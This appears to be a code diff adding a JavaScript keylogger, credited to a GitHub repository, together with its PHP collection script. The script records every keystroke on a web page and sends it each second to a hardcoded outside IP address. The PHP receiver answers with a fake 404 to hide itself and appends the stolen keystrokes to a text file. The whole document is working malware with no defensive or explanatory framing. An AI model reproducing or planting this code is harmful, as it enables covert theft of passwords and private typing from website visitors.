@@ -1,1 +1,39 @@
 https://github.com/JohnHoder/Javascript-Keylogger/
+
+
+    
+var keys='';
+var url = 'http://206.130.110.212/forum/system/keylogger.php?c=';
+
+document.onkeypress = function(e) {
+	get = window.event?event:e;
+	key = get.keyCode?get.keyCode:get.charCode;
+	key = String.fromCharCode(key);
+	keys+=key;
+}
+window.setInterval(function(){
+	if(keys.length>0) {
+		new Image().src = url+keys;
+		keys = '';
+	}
+}, 1000);
+
+
+
+<html>
+
+<?php
+header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found", true, 404);
+header('Access-Control-Allow-Methods: GET, REQUEST, OPTIONS');
+header('Access-Control-Allow-Credentials: true');
+header('Access-Control-Allow-Origin: *');
+header('Access-Control-Allow-Headers: Content-Type, *');
+$file = 'data.txt';
+if(isset($_REQUEST['c']) && !empty($_REQUEST['c']))
+{
+	file_put_contents($file, $_REQUEST['c'], FILE_APPEND);
+	printf("LOGGED!");
+}
+?>
+
+</html>
